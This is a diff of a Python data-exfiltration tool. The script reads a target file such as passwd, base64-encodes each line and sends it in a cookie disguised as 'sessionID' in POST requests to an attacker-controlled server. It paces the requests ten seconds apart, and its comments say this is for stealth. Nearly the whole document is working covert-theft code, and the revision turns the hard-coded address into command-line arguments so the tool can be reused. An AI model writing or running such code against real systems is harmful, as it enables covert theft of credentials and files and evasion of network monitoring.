@@ -1,64 +1,71 @@
-# read a file line by line
-# Store each read result as base64 and then print it
-# Create a cookie storing each encoded line and then send it to an http server
 import base64
 import requests
 import time
+import sys
 
-# Read the target file and then print out each contents of it. 
-def readFile(target_file):
+def usage():
+	if len(sys.argv) != 3:
+		print("Usage: <IP address of domain> <File to exfiltrate>")
+		sys.exit(1)
+
+# Read the target file and then print out each contents of it.
+def process_file(target_file):
 	with open(target_file) as fp:
-		# We turn the file into a list of elements with no new lines so we can feed the list element into a cookie
+		# Store each line in a list without new line trailings
 		line_list = fp.read().splitlines()
 
-		# Reads the entire line, we don't want the entire line. We want to store each line in a list which we then pass on and then traverse through each list element and loop through it in a cookie request
-		'''
-		count = 1
-		while line:
-			print(line.strip())
-			#line = fp.readline()
-		'''
-
+	# return this list for further processing
 	return line_list
 
-# Passwd file as PoC
-
-
-# The cookie which is going to store the base64 encoded data that needs to be output for decoding/reconstruction
-def exfil_cookie(data):
+# Specify the target domain which the attacker controls for exfil
+def exfil_cookie(data, target_domain):
+	# Access the cookie jar in which the data will be stored
 	jar = requests.cookies.RequestsCookieJar()
-	jar.set('sessionID', data, domain='192.168.0.17', path='/')
-	req = requests.post('http://192.168.0.17:8080/', cookies=jar)
-	#req_text = req.text
+	# Give the cookie an innocent name because stealth.
+	jar.set('sessionID', data, domain=target_domain, path='/')
+	# Request goes to attacker http server
+	req = requests.post('http://%s:8080/' % target_domain, cookies=jar)
 
+	# Each cookie which gets added is printed 
 	for cookie in jar:
 		# Base64 encoded lines of the target file which we print out
 		print(cookie.value)
+	# Return the cookie each time with a line of data
 	return jar
 
+# Base64 encoding function
 def encode_data(data):
 	data_bytes = data.encode('ascii')
-	msg_bytes = base64.b64encode(data_bytes)
-	msg = msg_bytes.decode('ascii')
+	encoded_msg_bytes = base64.b64encode(data_bytes)
+	encoded_msg = encoded_msg_bytes.decode('ascii')
 
-	return msg
+	return encoded_msg
 
+# Base64 decoding function
 def decode_data(data):
 	data_bytes = data.encode('ascii')
-	msg_bytes = base64.b64decode(data_bytes)
-	msg = msg_bytes.decode('ascii')
+	decoded_msg_bytes = base64.b64decode(data_bytes)
+	decoded_msg = decoded_msg_bytes.decode('ascii')
 
-	return msg
+	return decoded_msg
 
 
 def main():
-	target_file = readFile('passwd')
-# Get the for loop and then stick 
-	for line in target_file:
-		encoded_line = encode_data(line)
-		exfil_cookie(encoded_line)
-		# Time between each cookie request made for stealth and performance purposes
-		time.sleep(10)
-		print("Decoded base64 data:",decode_data(encoded_line))
+	usage()
+	attack_domain = sys.argv[1]
+	file_name = sys.argv[2]
 
+	try:
+		target_file = process_file(file_name)
+		# Get the for loop and then stick
+		for line in target_file:
+			base64_line = encode_data(line)
+			exfil_cookie(base64_line, sys.argv[1])
+			# Time between each cookie request made for stealth and performance purposes
+			time.sleep(10)
+	except Exception as e:
+		print(e)
+
+		#print("Decoded base64 data:",decode_data(encoded_line))
+		# Decoding should be done at the attacker side by parsing the incoming network capture and then decoding the base64 stored cookie and store it to a file
 main()
